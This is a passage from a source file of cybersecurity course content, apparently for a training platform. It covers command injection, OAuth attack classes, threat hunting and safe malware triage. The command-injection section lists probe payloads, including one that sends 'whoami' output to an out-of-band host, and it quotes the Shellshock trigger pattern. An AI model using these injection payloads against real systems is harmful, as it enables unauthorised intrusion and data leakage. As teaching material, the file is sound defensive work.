            ("Shell=False / execve", "Invoking a program directly with an argument array, bypassing shell parsing."),
            ("Allow-list validation", "Restricting input to a known-good set when a value must be interpolated."),
        ],
        "extra": [
            ("Testing and fixing", r"""**Detect** by probing each parameter that might reach a command:

```
; id            | id            & id            $(id)           `id`
%0a id          || id           && id           ; sleep 5       ; curl http://OOB/$(whoami)
```

**Fix**, in order of preference:
1. **Avoid the shell** — call the binary with an argument array (`shell=False`); this is the real fix.
2. **Avoid invoking external programs** at all where a library call will do (resolve DNS, process an image
   in-process).
3. **Allow-list** the input where a value must be passed (e.g. a hostname matched against a strict pattern).
4. **Never** rely on blacklisting metacharacters — encodings and shells differ, and argument injection remains.

Detection: alert on the web-server user spawning shells or unexpected child processes.
"""),
        ],
        "realworld": r"""Shellshock (CVE-2014-6271) turned command injection into an internet-scale event: because
Bash parsed trailing code in environment-variable function definitions, any service that set an env var from
user input (notably CGI, which maps HTTP headers to env vars) executed attacker code. Within hours it was mass-
exploited. Reproduce a benign command-injection lab and then re-implement the feature with `shell=False` to see
the class disappear.""",
        "mistakes": [
            "Building command strings with user input and passing them to a shell.",
            "Blacklisting a few metacharacters instead of avoiding the shell entirely.",
            "Forgetting argument injection — a leading dash can change a program's behaviour without any metacharacter.",
            "Shelling out to a tool when an in-process library would avoid the risk completely.",
            "Missing blind injection because 'nothing came back' — timing/OOB still confirms it.",
        ],
        "bestpractices": [
            "Invoke programs with an argument array and shell=False; never construct shell strings from input.",
            "Prefer in-process libraries over spawning external commands.",
            "Where interpolation is unavoidable, allow-list against a strict pattern.",
            "Run the service least-privilege so successful injection yields little.",
            "Detect web-server processes spawning shells or unexpected children.",
        ],
        "case": r"""**Shellshock (2014).** A 25-year-old Bash feature (exported function definitions) parsed and
executed trailing commands, so `() { :; }; <command>` in an environment variable ran that command. Via CGI, web
requests set those variables, yielding unauthenticated RCE on countless servers. The lesson: interpreters
evaluate more than you think, and the safe path is to never let untrusted data reach one.""",
    },

    # =====================================================================
    "oauth": {
        "theory": r"""OAuth 2.0 is an **authorization** framework: it lets a user grant a third-party application
limited access to their resources on another service without sharing their password, by issuing scoped access
tokens. It is the machinery behind "Sign in with Google" and countless API integrations. Crucially, OAuth is
about *delegated authorization* (what an app may do), not *authentication* (who the user is) — conflating the
two is the source of a whole class of vulnerabilities, which is exactly why OpenID Connect was layered on top
to do authentication properly.

OAuth's security rests on a small number of parameters being validated strictly: the `redirect_uri` (where the
authorization response is sent), the `state` (CSRF protection), and — in modern flows — PKCE (which binds the
authorization request to the client that started it). Most OAuth breaks are not cryptographic; they are
validation failures at these seams that let an attacker steal an authorization code or token, or trick a client
into accepting one it should not.""",
        "history": r"""OAuth 1.0 (2010, RFC 5849) used request signing; OAuth 2.0 (2012, RFC 6749) simplified this
by relying on TLS and bearer tokens, trading cryptographic complexity for deployment simplicity — and a larger
footgun surface. The ecosystem has since hardened it: PKCE (RFC 7636, 2015) originally for mobile and now for
all clients; the Security Best Current Practice (RFC 9700) which deprecates the implicit grant and mandates
exact redirect-URI matching; and OAuth 2.1, a consolidation that bakes those practices into the baseline.""",
        "internal": r"""The recommended **authorization-code flow with PKCE**:

1. The client redirects the user to the authorization server with `client_id`, `redirect_uri`, `scope`,
   `state`, and a PKCE `code_challenge`.
2. The user authenticates and consents; the server redirects back to the *registered* `redirect_uri` with an
   authorization `code` and the `state`.
3. The client verifies `state`, then exchanges the `code` (plus the PKCE `code_verifier`) at the token endpoint
   for an access token (and optionally a refresh token).
4. The client calls the resource API with the bearer access token.

The trust hinges on: exact `redirect_uri` matching (so codes cannot be sent to an attacker), `state`
verification (so responses cannot be forged/CSRF'd), and PKCE (so a stolen code cannot be redeemed by anyone
but the original client). Weaken any one and specific attacks open up.""",
        "terminology": [
            ("Authorization code", "A short-lived code exchanged for tokens at the token endpoint — the safest grant."),
            ("Access token / Refresh token", "The bearer credential for API calls / a longer-lived credential to get new access tokens."),
            ("redirect_uri", "Where the authorization response is delivered; must be matched exactly to prevent code theft."),
            ("state", "An opaque value echoed back to bind request and response — CSRF protection."),
            ("PKCE", "Proof Key for Code Exchange — binds the code to the client that requested it (RFC 7636)."),
            ("Scope", "The specific, limited permissions a token grants."),
            ("Confused deputy", "Tricking a trusted client into using a credential or code on the attacker's behalf."),
        ],
        "extra": [
            ("The classic OAuth attacks — all validation failures", r"""Each maps to a weakened parameter:

- **redirect_uri manipulation** — loose matching (prefix/substring/open redirect on the client) lets the code
  be delivered to the attacker. Fix: exact, pre-registered matching.
- **Missing/unchecked `state`** — enables CSRF (login CSRF, forced account linking). Fix: generate, bind and
  verify `state`.
- **Authorization code interception** — a public client's code stolen in transit is replayed. Fix: PKCE.
- **Implicit grant token leakage** — tokens in the URL fragment leak via history/referrer. Fix: don't use
  implicit; use code+PKCE (RFC 9700).
- **Token/audience confusion** — using OAuth for authentication and trusting an access token as proof of
  identity; or accepting a token minted for another client. Fix: use OpenID Connect ID tokens and validate
  `aud`/`iss`.
- **Mix-up attacks** — a client confused about which authorization server responded. Fix: the iss parameter
  and strict metadata handling.
"""),
        ],
        "realworld": r"""Real OAuth incidents have enabled full account takeover by combining an open redirect on a
client with loose redirect_uri handling to steal authorization codes, or by exploiting missing `state` to force
account linking. The pattern is always a validation seam, not broken crypto. Build a lab authorization server
and client, reproduce a redirect_uri and a missing-state issue, then harden with exact matching, `state`, and
PKCE.""",
        "mistakes": [
            "Loose redirect_uri matching (prefix/wildcard) instead of exact, pre-registered URIs.",
            "Omitting or not verifying the state parameter, opening CSRF and forced account-linking.",
            "Using the deprecated implicit grant and exposing tokens in URL fragments.",
            "Treating an OAuth access token as proof of identity instead of using OpenID Connect.",
            "Not validating token aud/iss, allowing token/audience confusion across clients.",
        ],
        "bestpractices": [
            "Use the authorization-code flow with PKCE for all client types; avoid the implicit grant.",
            "Require exact redirect_uri matching against a pre-registered allow-list.",
            "Generate, bind and verify state on every authorization request.",
            "For authentication, use OpenID Connect and validate the ID token's signature, aud and iss.",
            "Scope tokens minimally, keep lifetimes short, and store refresh tokens securely.",
        ],
        "case": r"""**Account takeover via redirect_uri + open redirect (recurring bug-bounty pattern).** Researchers
repeatedly chain a client's open redirect with permissive redirect_uri validation to exfiltrate authorization
codes and take over accounts. It is the clearest demonstration that OAuth's safety is only as strong as its
redirect and state validation — the crypto is rarely the problem.""",
    },

    # =====================================================================
    "threat-hunting": {
        "theory": r"""Threat hunting is the proactive, hypothesis-driven search for adversaries who have evaded
automated detection. It starts from the assumption that prevention and alerting are imperfect and that a
determined attacker may already be present, then goes looking for them in telemetry rather than waiting for an
alert. Hunting is human-led and creative where alerting is machine-led and repetitive; its outputs are not just
findings but new, durable detections that turn each successful hunt into permanent coverage.

The discipline is anchored by two ideas. David Bianco's **Pyramid of Pain** ranks indicators by how much it
hurts an adversary to change them — hashes and IPs are trivial to rotate, but tactics, techniques and
procedures (TTPs) are costly — so effective hunting targets behaviour high on the pyramid. And **MITRE ATT&CK**
supplies the behavioural vocabulary and a map of what to hunt for, technique by technique.""",
        "history": r"""Threat hunting emerged as mature SOCs recognised that signature-based detection missed
skilled adversaries with long dwell times. Bianco's Pyramid of Pain (2013) reframed indicators by adversary
cost; ATT&CK (2015) gave hunters a behavioural taxonomy; and the growth of rich endpoint and network telemetry
(Sysmon, EDR, Zeek) made behaviour-level hunting practical. It is now a defined function with its own loop,
distinct from — but feeding — detection engineering and incident response.""",
        "internal": r"""A hunt runs as a loop:

1. **Hypothesis** — a specific, testable statement, ideally tied to an ATT&CK technique and your environment:
   e.g. "an adversary is using WMI for lateral movement (T1047), visible as `wmiprvse.exe` spawning shells on
   servers."
2. **Data** — identify the telemetry that would show it (process creation with parent/child, network flows,
   authentication logs) and confirm you actually collect it.
3. **Hunt** — query, pivot and filter, distinguishing malicious from the (large) benign baseline. This is where
   knowing 'normal' matters most.
4. **Findings** — confirm or refute; if confirmed, hand to incident response.
5. **Operationalise** — turn what you learned into a detection (a Sigma rule), so the hunt need not be repeated
   manually.

The whole loop turns tacit adversary knowledge into codified, repeatable coverage.""",
        "terminology": [
            ("Hypothesis-driven hunt", "A hunt starting from a specific, testable statement about adversary behaviour."),
            ("Pyramid of Pain", "A ranking of indicators by how costly they are for an adversary to change."),
            ("TTP", "Tactics, Techniques and Procedures — behaviour high on the pyramid, the best hunting target."),
            ("Baseline / 'normal'", "Knowledge of expected activity, without which anomalies cannot be spotted."),
            ("Dwell time", "How long an adversary is present before detection — hunting aims to shrink it."),
            ("Operationalising", "Converting a hunt finding into a durable automated detection."),
        ],
        "extra": [
            ("Running a hunt, concretely", r"""Hunt for Kerberoasting (T1558.003) as a worked example:

1. **Hypothesis:** an adversary is requesting many service tickets with RC4 to crack offline.
2. **Data:** Windows Security Event **4769** (service ticket requests), including ticket encryption type and
   requesting account.
3. **Hunt (pseudo-query):**
   ```
   EventID=4769 AND TicketEncryptionType=0x17            // RC4
   | stats count by Account, count(distinct ServiceName)
   | where distinct_services > 10                        // one account, many SPNs
   ```
4. **Triage:** is this a vulnerability scanner, a misconfigured app, or an attacker? Pivot on the account's
   other activity.
5. **Operationalise:** publish a Sigma rule for the pattern so future occurrences alert automatically.

Validate your hunts and detections with **Atomic Red Team** — execute the technique safely and confirm your
hunt would have found it.
"""),
        ],
        "realworld": r"""Mature programs hunt continuously against their most relevant threats and measure success
by reduced dwell time and by the number of hunts that become standing detections. The teams that catch
sophisticated intrusions early are almost always hunting for TTPs (lateral movement, credential access,
persistence), not chasing hashes. Build a Sysmon+Sigma lab, generate technique telemetry with Atomic Red Team,
and run the full hunt loop end to end.""",
        "mistakes": [
            "Hunting for hashes/IPs (bottom of the pyramid) that adversaries rotate trivially.",
            "Starting without a hypothesis, producing aimless dashboard-staring.",
            "Hunting for a technique whose required telemetry you do not actually collect.",
            "Not baselining 'normal', so every result looks anomalous and nothing is actionable.",
            "Finding something and not operationalising it into a detection, so the work does not compound.",
        ],
        "bestpractices": [
            "Frame every hunt as a specific, testable hypothesis tied to an ATT&CK technique.",
            "Target TTPs high on the Pyramid of Pain, not easily-changed atomic indicators.",
            "Confirm you collect the needed data source before committing to a hunt.",
            "Invest in understanding your environment's baseline; it is the hunter's core asset.",
            "Turn every confirmed hunt into a Sigma detection and validate with Atomic Red Team.",
        ],
        "case": r"""**Long-dwell intrusions.** Post-incident reports of major breaches repeatedly show adversaries
present for months, using legitimate tools (living-off-the-land) that signature detection missed but a
behaviour-focused hunt (unusual parent/child processes, anomalous service-ticket requests, new persistence)
would have surfaced. Pick one public report, extract the TTPs, and design the hunts that would have caught it.""",
    },

    # =====================================================================
    "malware-fundamentals": {
        "theory": r"""Malware is software written to act against the interests of the system's owner — to steal,
spy, disrupt, encrypt or control. Understanding it means looking past scary labels to a small set of questions:
how does it get in (delivery), how does it run and survive (execution and persistence), what does it do
(capability), and how does it talk to its operator (command and control)? Every family, however sophisticated,
is some combination of answers to those questions, which is why a behavioural model beats a taxonomy of names.

Analysis is done **safely, in isolation**, on inert samples in a disposable lab that cannot reach production or
the internet. The two complementary approaches are *static* analysis (examine the file without running it) and
*dynamic* analysis (run it in a controlled sandbox and observe behaviour). Neither is complete alone: static
analysis is defeated by packing and obfuscation; dynamic analysis is defeated by evasion and by only showing
the paths that execute. Skilled analysts iterate between them.""",
        "history": r"""Malware evolved from experiments and pranks (the 1971 Creeper, 1986 Brain boot-sector virus)
into criminal and state tooling. The 1988 Morris Worm proved network-scale impact; the 2000s brought mass-
mailing worms and botnets; the 2010s brought professionalised crimeware, ransomware-as-a-service, and nation-
state implants (Stuxnet, 2010, targeted industrial controllers). The analyst's toolkit matured in step: PE
analysis, sandboxes, YARA (2013) for classification, and memory forensics for fileless threats.""",
        "internal": r"""A malware analysis lab and workflow:

- **Isolation** — a disposable VM (or CyberForge-hosted container) on an *internal* network with no route to
  the host or internet, with snapshots so you can revert after each detonation.
- **Triage (static)** — hashes, file type, strings, and imports reveal intent quickly. A packed file (high
  entropy, few imports) tells you to unpack before deeper static work.
- **Behavioural (dynamic)** — run the sample while monitoring process, file, registry and network activity;
  capture the traffic; note persistence and C2 attempts.
- **Deeper RE** — disassemble/decompile to understand specific capabilities and extract configuration/IOCs.
- **Output** — a report: classification, capabilities, IOCs, ATT&CK mapping, and detections (YARA/Sigma).

The discipline is to observe without being fooled: assume the sample checks for VMs, debuggers and analysis
tools, and that it only reveals some behaviour on the first run.""",
        "terminology": [
            ("Static analysis", "Examining a sample without executing it (strings, imports, structure, disassembly)."),
            ("Dynamic analysis", "Running a sample in a controlled sandbox and observing its behaviour."),
            ("Packer / crypter", "Software that compresses/encrypts a payload to hide it from static analysis."),
            ("IOC", "Indicator of Compromise — an artefact (hash, domain, mutex, path) used to detect the malware."),
            ("C2 (Command and Control)", "The channel malware uses to receive commands and exfiltrate data."),
            ("Persistence", "Mechanisms that keep malware running across reboots (services, run keys, scheduled tasks)."),
            ("Detonation", "Deliberately executing a sample in isolation to observe it."),
        ],
        "extra": [
            ("First-look triage safely", r"""Never double-click an unknown sample. Triage first, in isolation:

```bash
sha256sum sample.bin                    # identity; check reputation offline in your notes
file sample.bin                         # type
strings -n 8 sample.bin | less          # URLs, paths, commands, mutexes
# PE specifics
pecheck / pefile: imports, sections, entropy, compile timestamp
capa sample.bin                         # capability detection from patterns
yara rules/ sample.bin                  # family classification
```

High entropy + almost no imports means packed; unpack (often by running to the OEP under a debugger, or a known
unpacker) before deeper static analysis. Only then detonate in the sandbox, revert the snapshot afterwards, and
never let the lab reach the internet unless you deliberately and safely proxy C2.
"""),
        ],
        "realworld": r"""Stuxnet (2010) is the landmark case study: a highly-targeted worm that used multiple
zero-days and stolen certificates to reach air-gapped industrial systems and sabotage centrifuges — a
demonstration that malware can cause physical effects and that analysis reveals intent and attribution clues.
For hands-on practice, analyse a *benign* lab sample end to end in isolation and produce a full report, then map
its behaviour to ATT&CK.""",
        "mistakes": [
            "Running an unknown sample outside a properly isolated, revertible lab.",
            "Trusting static analysis alone against a packed or obfuscated sample.",
            "Trusting dynamic analysis alone, missing behaviour gated behind anti-analysis checks.",
            "Letting the analysis environment reach the internet or the host network.",
            "Reporting names instead of behaviour, IOCs and detections that defenders can act on.",
        ],
        "bestpractices": [
            "Analyse only in a disposable, internal-network VM/container with snapshots.",
            "Triage statically before ever detonating; unpack before deep static work.",
            "Iterate between static and dynamic analysis; neither is complete alone.",
            "Assume anti-VM/anti-debug/anti-sandbox and plan to defeat it.",
            "Deliver behaviour, IOCs, ATT&CK mapping and YARA/Sigma detections, not just a family name.",
        ],
        "case": r"""**Stuxnet (2010).** A worm combining four zero-days, stolen code-signing certificates, and
deep knowledge of Siemens PLCs to physically damage uranium-enrichment centrifuges while showing operators
normal readings. Its analysis (by multiple vendors) is a masterclass in how static and dynamic techniques,
combined, reconstruct capability and intent — and in why isolation and patience matter when the sample is this
sophisticated.""",
    },
}
